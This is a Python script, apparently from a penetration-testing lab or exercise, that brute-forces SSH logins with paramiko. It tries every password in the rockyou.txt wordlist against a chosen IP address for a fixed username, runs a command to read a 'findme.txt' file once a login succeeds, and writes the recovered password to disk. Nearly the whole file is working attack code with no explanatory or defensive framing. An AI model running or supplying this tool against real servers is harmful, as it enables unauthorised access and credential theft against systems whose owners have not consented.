import paramiko
import socket
import time
#import recon


#host = '192.63.15.200' #recon.get_ipv4_address() change to make this work later
#target = '192.63.15.100' #econ.get_all_reachable_hosts()


def get_target(hosts):

    target = input('Which ip address would you like to SSH into (q to quit): ')

    while target not in hosts and target != 'q':
        target = input("try again or enter q to quit")
    
    if target == "q":
        print('quitting')
        return 'q'
    
    return target
    
def save_password(password):
    with open('./offensive/pentest/ssh_password.txt', 'w') as file:
        file.write(password)

    file.close()


def make_connection(user, passwrd, target):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        
        client.connect(port=22,username=user, password=passwrd, hostname=target, timeout=4)

        stdin,stdout,stderr = client.exec_command('cat ./Desktop/findme.txt')
        print(stdout.read().decode().strip())
        print(f"success! {passwrd} is the password \n")
        print(f"the password ({passwrd}) has been saved in ssh_password.txt for future use")
        
        save_password(passwrd)

        client.close()
        return True
    
    except paramiko.AuthenticationException:
        print(f"{passwrd} failed \n")
        client.close()
        return False
    
def brute_force(targetIP):

    with open('./offensive/pentest/rockyou.txt') as file:

        passwords = file.readlines()

        for password in passwords:

            print(f"trying {password}")
            state = make_connection(user='yttjr', passwrd=password.strip(), target=targetIP)

            if state == True:
                break
    file.close()
        
